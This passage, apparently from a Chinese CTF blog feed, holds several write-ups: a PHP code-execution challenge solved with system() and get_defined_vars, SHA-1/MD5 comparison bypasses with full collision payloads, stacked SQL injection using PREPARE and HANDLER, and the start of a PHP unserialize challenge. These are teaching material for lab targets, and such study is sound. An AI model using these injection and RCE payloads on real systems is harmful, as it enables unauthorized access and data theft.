//没有匹配第一个匹配整体，递归停止        )//匹配第二次递归剩下的表达式，即第三个匹配的整体\),    )//匹配第一次递归剩下的表达式，即\), )//匹配原表达式剩下的表达式，即\)</code></pre><p>利用</p><pre class=" language-1"><code class="language-1">code=var_dump(get_defined_vars());&b=1</code></pre><p>寻找get数组位置，回显</p><pre class=" language-1"><code class="language-1">array(4) { ["_GET"]=> array(2) { ["code"]=> string(29) "var_dump(get_defined_vars());" ["b"]=> string(1) "1" } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } } </code></pre><p>发现get数组在第一位，利用current取出</p><pre class=" language-1"><code class="language-1">code=var_dump(current(get_defined_vars()));&b=1;</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">array(2) { ["code"]=> string(38) "var_dump(current(get_defined_vars()));" ["b"]=> string(2) "1;" } </code></pre><p>发现b的值在后一位，由于end、next等函数被ban掉，利用数组操作array_reverse交换位置</p><pre class=" language-1"><code class="language-1">code=var_dump(array_reverse(current(get_defined_vars())));&b=1;</code></pre><p>得到</p><pre class=" language-1"><code class="language-1">array(2) { ["b"]=> string(2) "1;" ["code"]=> string(53) "var_dump(array_reverse(current(get_defined_vars())));" } </code></pre><p>利用current取出</p><pre class=" language-1"><code class="language-1">code=var_dump(current(array_reverse(current(get_defined_vars()))));&b=1;</code></pre><p>成功取出b，将b的值改为ls，同时改变var_dump为system</p><pre class=" language-1"><code class="language-1">code=system(current(array_reverse(current(get_defined_vars()))));&b=ls</code></pre><p>得到</p><pre class=" language-1"><code class="language-1">flag.php index.php</code></pre><p>最后的payload为</p><pre class=" language-1"><code class="language-1">code=system(current(array_reverse(current(get_defined_vars()))));&b=cat%20flag.php</code></pre><p>得到flag：cazy{b3st_w1sh_f0R_XiAn!}</p><p>参考资料：<br><a href="https://blog.csdn.net/silence1_/article/details/102835743">https://blog.csdn.net/silence1_/article/details/102835743</a><br><a href="https://www.bilibili.com/read/cv9136420/">https://www.bilibili.com/read/cv9136420/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-RCE ctf-正则表达式 长安战疫复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHA-1与MD5绕过</title>
      <link href="/2022/01/09/SHA-1%E4%B8%8EMD5%E7%BB%95%E8%BF%87/"/>
      <url>/2022/01/09/SHA-1%E4%B8%8EMD5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SHA-1绕过"><a href="#SHA-1绕过" class="headerlink" title="SHA-1绕过"></a>SHA-1绕过</h1><p>在输入的a、b两字符串本身不相同的情况下，令<strong>SHA-1</strong>值相同，分为几种情况：</p><h2 id="情况一：弱比较"><a href="#情况一：弱比较" class="headerlink" title="情况一：弱比较"></a>情况一：弱比较</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> flag<span class="token punctuation">;</span>    <span class="token keyword">else</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在这样的弱比较里，0e开头的会被识别成科学计数法，为0×10^x，结果均为0，比较时0=0为true绕过。<br>常用的弱比较绕过：<a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a><br>譬如可构造：</p><pre class=" language-1"><code class="language-1">/?a=aaroZmOk&b=aaK1STfY</code></pre><h2 id="情况二：可以用数组绕过的强比较"><a href="#情况二：可以用数组绕过的强比较" class="headerlink" title="情况二：可以用数组绕过的强比较"></a>情况二：可以用数组绕过的强比较</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>像这样的强比较，上面的方法就失效了，但是如果传入的不是字符串而是数组，不但<strong>sha1()函数</strong>不会报错，结果还会返回<strong>null</strong>，在强比较里面<strong>null=null</strong>为true绕过<br>可构造</p><pre class=" language-1"><code class="language-1">/?a[]=1&b[]=2</code></pre><h2 id="情况三：不可以用数组绕过的强比较"><a href="#情况三：不可以用数组绕过的强比较" class="headerlink" title="情况三：不可以用数组绕过的强比较"></a>情况三：不可以用数组绕过的强比较</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>像这样，其中<strong>is_array()<strong>函数用来检测是否为数组，发现我们没法用数组进行绕过。<br>搜索发现</strong>SHA-1算法</strong>已经碰撞成功，原理是构建了两个<strong>SHA-1</strong>值相同但不一样的pdf文件<a href="https://shattered.it/static/shattered-1.pdf">1.pdf</a>和<a href="https://shattered.it/static/shattered-2.pdf">2.pdf</a>然而如何比较这两个文件的不同之处到底在哪里呢?<br>通过cmp命令</p><pre class=" language-linux"><code class="language-linux">cmp -l 1.pdf 2.pdf</code></pre><p>发现不同的部分在前320个字节。<br>但是如何把这个部分拿去登录呢？<br>将两个文件的前320个字节用url编码(urlencode)，可以构造如下：</p><pre class=" language-1"><code class="language-1">/?a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></pre><p>进行请求即可。</p><h1 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h1><p>三种情况都与<strong>SHA-1</strong>绕过的步骤相同。<br>在第三种情况下需要构建</p><pre class=" language-1"><code class="language-1">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre><p>进行请求。<br>参考：<br><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730">https://blog.csdn.net/caiqiiqi/article/details/68953730</a><br><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">https://blog.csdn.net/EC_Carrot/article/details/109525162</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-MD5 ctf-SHA-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界supersqli题解</title>
      <link href="/2022/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界supersqli题解"><a href="#攻防世界supersqli题解" class="headerlink" title="攻防世界supersqli题解"></a>攻防世界supersqli题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><h3 id="show语句"><a href="#show语句" class="headerlink" title="show语句"></a>show语句</h3><pre class=" language-mysql"><code class="language-mysql">--MySQL 常用show命令a. show tables或show tables from database_name; -- 显示当前数据库中所有表的名称。b. show databases; -- 显示mysql中所有数据库的名称。c. show columns from table_name from database_name; 或show columns from database_name.table_name; -- 显示表中列名称。d. show grants for user_name; -- 显示一个用户的权限，显示结果类似于grant 命令。e. show index from table_name; -- 显示表的索引。f. show status; -- 显示一些系统特定资源的信息，例如，正在运行的线程数量。g. show variables; -- 显示系统变量的名称和值。h. show processlist; -- 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。i. show table status; -- 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。j. show privileges; -- 显示服务器所支持的不同权限。k. show create database database_name; -- 显示create database 语句是否能够创建指定的数据库。l. show create table table_name; -- 显示create database 语句是否能够创建指定的数据库。m. show engies; -- 显示安装以后可用的存储引擎和默认引擎。n. show innodb status; -- 显示innoDB存储引擎的状态。o. show logs; -- 显示BDB存储引擎的日志。p. show warnings; -- 显示最后一个执行的语句所产生的错误、警告和通知。q. show errors; -- 只显示最后一个执行语句所产生的错误。r. show [storage] engines; --显示安装后的可用存储引擎和默认引擎。--MySQL自带的mysqlshow命令--可以让我们在不连接到MySQL客户端的情况下查看MySQL的一些参数、数据库、表、列、索引等信息，其使用方法如下： 1. mysqlshow -uroot -p    --查看都有哪些库2. mysqlshow -uroot -p wyzc    --查看某个库里（wyzc）都有哪些表3. mysqlshow -uroot -p -v wyzc    --加上-v参数后可以显示每张表有多少列4. mysqlshow -uroot -p -v -v wyzc    --加2个-v参数，可以显示出每张表有多少行5. mysqlshow -uroot -p wyzc City    --在库名（wyzc）后面加上表名（City），可以查看该表的详细信息。注：加上-i参数，可以查看该表的所有详细信息6. mysqlshow -uroot -p wyzc City ID    --查看某张表的某一个列的信息7. mysqlshow -uroot -p -k wyzc City    --加上-k参数查看该表的索引和列信息8. mysqlshow -uroot -p -k wyzc City invalid_col_name    --只查看某表索引信息</code></pre><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译的语法</p><pre class=" language-mysql"><code class="language-mysql"># 定义预处理语句PREPARE stmt_name FROM preparable_stmt;# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];# 删除(释放)定义{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><p>定义变量</p><pre class=" language-mysql"><code class="language-mysql">SET @var_name = expr [, @var_name = expr] ...也可使用select语句来定义：SELECT @var_name := expr [, @var_name = expr] ...</code></pre><p>处理</p><pre class=" language-mysql"><code class="language-mysql">--定义查询集群信息的预编译PREPARE s1 FROM 'select distinct(clusterName), Version, ts from m_fds_version order by ts desc limit ?';--定义集群个数变量select @limit_num:=count(distinct(clusterName)) from m_fds_version;--执行预编译语句EXECUTE s1 USING @limit_num;--删除预编译DROP PREPARE s1;</code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>进入题目发现网页以get的形式输入了一个inject的参数，尝试输入1’#，发现回显正常，尝试select<br>构造</p><pre class=" language-1"><code class="language-1">inject=1'or select * from database#</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">preg_match("/select|update|delete|drop|insert|where|\./i",$inject);</code></pre><p>发现select被ban掉了，且无法通过大小写绕过，尝试堆叠注入。<br>构造</p><pre class=" language-1"><code class="language-1">inject=1';show databases;</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">array(1) {  [0]=>  string(11) "ctftraining"}array(1) {  [0]=>  string(18) "information_schema"}array(1) {  [0]=>  string(5) "mysql"}array(1) {  [0]=>  string(18) "performance_schema"}array(1) {  [0]=>  string(9) "supersqli"}array(1) {  [0]=>  string(4) "test"}</code></pre><p>构造</p><pre class=" language-1"><code class="language-1">inject=1';show tables;</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">array(1) {  [0]=>  string(16) "1919810931114514"}array(1) {  [0]=>  string(5) "words"}</code></pre><p>构造（注意：<em><strong>字符串为表名操作时要加反引号</strong></em>）</p><pre class=" language-1"><code class="language-1">inject=1';show columns from `1919810931114514`;</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">array(6) {  [0]=>  string(4) "flag"  [1]=>  string(12) "varchar(100)"  [2]=>  string(2) "NO"  [3]=>  string(0) ""  [4]=>  NULL  [5]=>  string(0) ""}</code></pre><p>找到flag，最后要绕过select来输出表内的内容，可以采用预编译的方式。<br>构造</p><pre class=" language-1"><code class="language-1">inject=1';set @sql=concat('sel', 'ect * from `1919810931114514`');PREPARE kb from @sql;EXECUTE kb;</code></pre><p>回显</p><pre class=" language-1"><code class="language-1">array(1) {  [0]=>  string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"}</code></pre><p>得到flag。</p><p>2022年1月28日更新：<br>在GYCTF2020 Blacklist 1中set等函数同样被ban掉，可以使用HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭 。于是可以构建payload：</p><pre class=" language-1"><code class="language-1">1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><p>参考：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">https://www.cnblogs.com/0nth3way/articles/7128189.html</a><br><a href="https://www.cnblogs.com/zhaoshujie/p/10422396.html">https://www.cnblogs.com/zhaoshujie/p/10422396.html</a><br><a href="https://blog.csdn.net/weixin_35857225/article/details/113598435">https://blog.csdn.net/weixin_35857225/article/details/113598435</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web_php_unserialize题解</title>
      <link href="/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_unserialize%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_unserialize%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界web-php-unserialize题解"><a href="#攻防世界web-php-unserialize题解" class="headerlink" title="攻防世界web_php_unserialize题解"></a>攻防世界web_php_unserialize题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token punctuation">[</span>oc<span class="token punctuation">]</span>就是正则表达式的意思\d<span class="token punctuation">:</span>  匹配一个数字字符。等价于 <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>。<span class="token operator">+</span><span class="token punctuation">:</span>  匹配前面的子表达式一次或多次。例如，<span class="token string">'zo+'</span> 能匹配 <span class="token string">"zo"</span> 以及 <span class="token string">"zoo"</span>，但不能匹配 <span class="token string">"z"</span>。<span class="token operator">+</span> 等价于 <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">}</span>。<span class="token operator">/</span>i<span class="token punctuation">:</span>  表示匹配的时候不区分大小写</code></pre><h3 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h3><p>参考：<a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a><br>preg_match 函数用于执行一个正则表达式匹配。</p><pre class=" language-php"><code class="language-php">int <span class="token function">preg_match</span> <span class="token punctuation">(</span> string <span class="token variable">$pattern</span> <span class="token punctuation">,</span> string <span class="token variable">$subject</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token operator">&amp;</span><span class="token variable">$matches</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$offset</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p>$pattern: 要搜索的模式，字符串形式。<br>$subject: 输入字符串。<br>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。<br>$flags：flags 可以被设置为以下标记值：<br>1.PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。<br>2.offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。<br>preg_match的返回值为0（未匹配）或1。<br>一般来说preg_match(‘/[oc]:\d+:/i’, $var)是用来检查是否被序列化的，一般的绕过方法是在第一个数字前加一个’+’，具体原因参考：<a href="https://www.phpbug.cn/archives/32.html">https://www.phpbug.cn/archives/32.html</a></p><h3 id="不同修饰符序列化后的值差异"><a href="#不同修饰符序列化后的值差异" class="headerlink" title="不同修饰符序列化后的值差异"></a>不同修饰符序列化后的值差异</h3><p>访问控制修饰符的不同，序列化后属性的长度和属性值会有所不同，如下所示：<br>public属性被序列化的时候属性值会变成属性名<br>protected属性被序列化的时候属性值会变成\x00*\x00属性名<br>private属性被序列化的时候属性值会变成\x00类名\x00属性名<br>其中：\x00表示空字符，但是还是占用一个字符位置<br>特别注意的是，因为浏览器会自动解码\x00，但实际base64编码是需要加上\x00的，所以最后这个base64编码需要使用php函数才有效（简单来说都在php环境中使用）</p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><p><a href="https://www.cnblogs.com/king-kb/p/15647685.html">https://www.cnblogs.com/king-kb/p/15647685.html</a> 的unserialize3中的题解有讲</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>进入题目环境，看到源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>先分析主函数部分</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 